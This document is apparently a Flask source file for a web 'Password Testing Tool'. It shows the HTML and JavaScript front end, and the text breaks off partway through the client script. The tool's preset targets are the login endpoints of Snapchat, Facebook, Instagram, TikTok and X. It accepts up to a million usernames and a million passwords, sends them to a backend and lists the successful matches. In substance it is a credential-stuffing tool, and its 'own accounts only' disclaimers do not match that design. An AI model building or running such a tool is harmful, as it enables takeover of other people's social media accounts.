# app.py - Save this as app.py and run with: python app.py

from flask import Flask, render_template_string, request, jsonify
import threading
import time
import requests
from bs4 import BeautifulSoup
import re

app = Flask(__name__)

# HTML Template for the website
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Testing Tool - Educational Purpose Only</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 1.1em;
        }
        
        .warning {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-left: 4px solid #ffc107;
            margin: 20px;
            border-radius: 5px;
        }
        
        .warning h3 {
            margin-bottom: 10px;
        }
        
        .warning ul {
            margin-left: 20px;
        }
        
        .content {
            padding: 30px;
        }
        
        .input-section {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        .input-group input, .input-group select, .input-group textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        
        .input-group input:focus, .input-group select:focus, .input-group textarea:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .input-group textarea {
            min-height: 150px;
            font-family: monospace;
        }
        
        .input-help {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }
        
        .button-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin: 30px 0;
        }
        
        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            flex: 1;
            min-width: 200px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        
        .btn-secondary {
            background: #6c757d;
            color: white;
        }
        
        .btn-secondary:hover {
            background: #5a6268;
        }
        
        .btn-danger {
            background: #dc3545;
            color: white;
        }
        
        .btn-danger:hover {
            background: #c82333;
        }
        
        .progress-container {
            margin: 20px 0;
            display: none;
        }
        
        .progress-bar {
            width: 100%;
            height: 30px;
            background: #f0f0f0;
            border-radius: 15px;
            overflow: hidden;
            position: relative;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            transition: width 0.3s;
            width: 0%;
        }
        
        .progress-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #333;
            font-weight: bold;
            text-shadow: 1px 1px 2px rgba(255,255,255,0.5);
        }
        
        .results-section {
            margin-top: 30px;
        }
        
        .results-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
            padding-bottom: 10px;
        }
        
        .tab {
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px 5px 0 0;
            transition: all 0.3s;
        }
        
        .tab:hover {
            background: #f0f0f0;
        }
        
        .tab.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .results-panel {
            display: none;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 15px;
        }
        
        .results-panel.active {
            display: block;
        }
        
        .result-item {
            padding: 10px;
            border-bottom: 1px solid #e0e0e0;
            font-family: monospace;
        }
        
        .result-item.success {
            background: #d4edda;
            color: #155724;
        }
        
        .result-item.failure {
            background: #f8d7da;
            color: #721c24;
        }
        
        .result-item .username {
            font-weight: bold;
            color: #667eea;
        }
        
        .result-item .password {
            color: #28a745;
        }
        
        .result-item .email {
            color: #17a2b8;
            font-size: 0.9em;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        
        .stat-card h3 {
            font-size: 2em;
            margin-bottom: 5px;
        }
        
        .stat-card p {
            opacity: 0.9;
        }
        
        .footer {
            background: #f8f9fa;
            padding: 20px;
            text-align: center;
            color: #666;
            border-top: 1px solid #e0e0e0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Password Testing Tool</h1>
            <p>For Educational and Security Testing Purposes Only</p>
        </div>
        
        <div class="warning">
            <h3>⚠️ LEGAL WARNING</h3>
            <p>This tool is for testing your OWN accounts ONLY! Using it against others' accounts without permission is ILLEGAL and may result in criminal charges.</p>
            <ul>
                <li>Only test accounts you own</li>
                <li>Respect rate limits and terms of service</li>
                <li>You are responsible for how you use this tool</li>
            </ul>
        </div>
        
        <div class="content">
            <div class="input-section">
                <div class="input-group">
                    <label>Target URL:</label>
                    <select id="targetUrl">
                        <option value="https://accounts.snapchat.com/accounts/login">Snapchat</option>
                        <option value="https://m.facebook.com/login.php">Facebook Mobile</option>
                        <option value="https://www.instagram.com/accounts/login/ajax/">Instagram</option>
                        <option value="https://www.tiktok.com/login">TikTok</option>
                        <option value="https://x.com/i/flow/login">X (Twitter)</option>
                    </select>
                    <div class="input-help">Or enter custom URL below</div>
                    <input type="url" id="customUrl" placeholder="Enter custom URL (optional)" style="margin-top: 10px;">
                </div>
                
                <div class="input-group">
                    <label>Usernames/Emails:</label>
                    <textarea id="usernames" placeholder="Enter one username/email per line&#10;Example:&#10;john.doe@gmail.com&#10;jane_smith@yahoo.com&#10;+1234567890">john.doe@gmail.com
jane_smith@yahoo.com
+1234567890</textarea>
                    <div class="input-help">Max 1,000,000 entries. One per line.</div>
                </div>
                
                <div class="input-group">
                    <label>Passwords:</label>
                    <textarea id="passwords" placeholder="Enter one password per line&#10;Example:&#10;123456&#10;password123&#10;qwerty">123456
password123
qwerty
111111
letmein</textarea>
                    <div class="input-help">Max 1,000,000 entries. One per line.</div>
                </div>
            </div>
            
            <div class="input-group">
                <label>Additional Info (Email/Phone for duplicate usernames):</label>
                <textarea id="additionalInfo" placeholder="Enter email/phone for each username (one per line, matching username order)&#10;Example:&#10;john.doe@gmail.com, john.doe@company.com, +1234567890&#10;jane_smith@yahoo.com, jane.smith@gmail.com">john.doe@gmail.com, john.doe@company.com, +1234567890
jane_smith@yahoo.com, jane.smith@gmail.com</textarea>
                <div class="input-help">Comma-separated values for each username</div>
            </div>
            
            <div class="button-group">
                <button class="btn btn-primary" onclick="startTesting()">▶ Start Testing</button>
                <button class="btn btn-secondary" onclick="stopTesting()">⏹ Stop Testing</button>
                <button class="btn btn-danger" onclick="clearResults()">🗑 Clear Results</button>
            </div>
            
            <div class="progress-container" id="progressContainer">
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                    <span class="progress-text" id="progressText">0%</span>
                </div>
                <p id="statusText" style="text-align: center; margin-top: 10px;">Ready to start...</p>
            </div>
            
            <div class="stats" id="stats">
                <div class="stat-card">
                    <h3 id="totalTests">0</h3>
                    <p>Total Tests</p>
                </div>
                <div class="stat-card">
                    <h3 id="successCount">0</h3>
                    <p>Success</p>
                </div>
                <div class="stat-card">
                    <h3 id="failureCount">0</h3>
                    <p>Failed</p>
                </div>
                <div class="stat-card">
                    <h3 id="uniqueUsers">0</h3>
                    <p>Unique Users</p>
                </div>
            </div>
            
            <div class="results-section">
                <div class="results-tabs">
                    <div class="tab active" onclick="showTab('success')">✅ Success (<span id="successTabCount">0</span>)</div>
                    <div class="tab" onclick="showTab('failure')">❌ Failed (<span id="failureTabCount">0</span>)</div>
                    <div class="tab" onclick="showTab('all')">📋 All Results</div>
                </div>
                
                <div class="results-panel active" id="successPanel">
                    <h3>✅ Successful Matches</h3>
                    <div id="successResults"></div>
                </div>
                
                <div class="results-panel" id="failurePanel">
                    <h3>❌ Failed Attempts</h3>
                    <div id="failureResults"></div>
                </div>
                
                <div class="results-panel" id="allPanel">
                    <h3>📋 All Test Results</h3>
                    <div id="allResults"></div>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>⚠️ For educational and authorized security testing only. Users are responsible for complying with all applicable laws.</p>
        </div>
    </div>
    
    <script>
        let isTesting = false;
        let results = {
            success: [],
            failure: [],
            all: []
        };
        
        function showTab(tabName) {
            // Update tab styling
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            event.target.classList.add('active');
            
            // Show corresponding panel
            document.querySelectorAll('.results-panel').forEach(panel => panel.classList.remove('active'));
            document.getElementById(tabName + 'Panel').classList.add('active');
        }
        
        function updateResults() {
            // Update counts
            document.getElementById('successTabCount').textContent = results.success.length;
            document.getElementById('failureTabCount').textContent = results.failure.length;
            document.getElementById('totalTests').textContent = results.all.length;
            document.getElementById('successCount').textContent = results.success.length;
            document.getElementById('failureCount').textContent = results.failure.length;
            
            // Update displays
            displaySuccessResults();
            displayFailureResults();
            displayAllResults();
        }
        
        function displaySuccessResults() {
            const container = document.getElementById('successResults');
            container.innerHTML = '';
            
            results.success.forEach(result => {
                const div = document.createElement('div');
                div.className = 'result-item success';
                div.innerHTML = `
                    <div><span class="username">👤 ${result.username}</span></div>
                    <div><span class="password">🔑 ${result.password}</span></div>
                    <div><span class="email">📧 ${result.email || 'No email provided'}</span></div>
                    <div><small>${result.timestamp}</small></div>
                `;
                container.appendChild(div);
            });
        }
        
        function displayFailureResults() {
            const container = document.getElementById('failureResults');
            container.innerHTML = '';
            
            results.failure.forEach(result => {
                const div = document.createElement('div');
                div.className = 'result-item failure';
                div.innerHTML = `
                    <div><span class="username">👤 ${result.username}</span> - 
                    <span class="password">🔑 ${result.password}</span></div>
                    <div><small>${result.timestamp}</small></div>
                `;
                container.appendChild(div);
            });
        }
        
        function displayAllResults() {
            const container = document.getElementById('allResults');
            container.innerHTML = '';
            
            results.all.forEach(result => {
                const div = document.createElement('div');
                div.className = `result-item ${result.success ? 'success' : 'failure'}`;
                div.innerHTML = `
                    <div><span class="username">👤 ${result.username}</span> - 
                    <span class="password">🔑 ${result.password}</span></div>
                    <div><span class="email">📧 ${result.email || 'No email'}</span></div>
                    <div><small>${result.timestamp} - ${result.success ? '✅ Success' : '❌ Failed'}</small></div>
                `;
                container.appendChild(div);
            });
        }
        
        function updateProgress(percent, status) {
            document.getElementById('progressFill').style.width = percent + '%';
            document.getElementById('progressText').textContent = percent + '%';
            document.getElementById('statusText').textContent = status;
        }
        
        async function startTesting() {
            if (isTesting) {
                alert('Testing already in progress!');
                return;
            }
            
            // Get input values
            const targetUrl = document.getElementById('customUrl').value || 
                             document.getElementById('targetUrl').value;
            const usernames = document.getElementById('usernames').value.split('\\n').filter(u => u.trim());
            const passwords = document.getElementById('passwords').value.split('\\n').filter(p => p.trim());
            const additionalInfo = document.getElementById('additionalInfo').value.split('\\n').filter(i => i.trim());
            
            // Validate inputs
            if (!targetUrl) {
                alert('Please select or enter a target URL');
                return;
            }
            
            if (usernames.length === 0) {
                alert('Please enter at least one username');
                return;
            }
            
            if (passwords.length === 0) {
                alert('Please enter at least one password');
                return;
            }
            
            if (usernames.length > 1000000) {
                alert('Maximum 1,000,000 usernames allowed');
                return;
            }
            
            if (passwords.length > 1000000) {
                alert('Maximum 1,000,000 passwords allowed');
                return;
            }
            
            // Show progress
            document.getElementById('progressContainer').style.display = 'block';
            document.getElementById('uniqueUsers').textContent = usernames.length;
            
            isTesting = true;
            
            // Prepare data for backend
            const testData = {
                targetUrl: targetUrl,
                usernames: usernames,
                passwords: passwords,
                additionalInfo: additionalInfo
            };
            
            try {
                const response = await fetch('/start_test', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(testData)
                });
                
                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                
                while (true) {
                    const { value, done } = await reader.read();
                    if (done) break;
                    
                    const chunk = decoder.decode(value);
                    const lines = chunk.split('\\n');
                    
                   
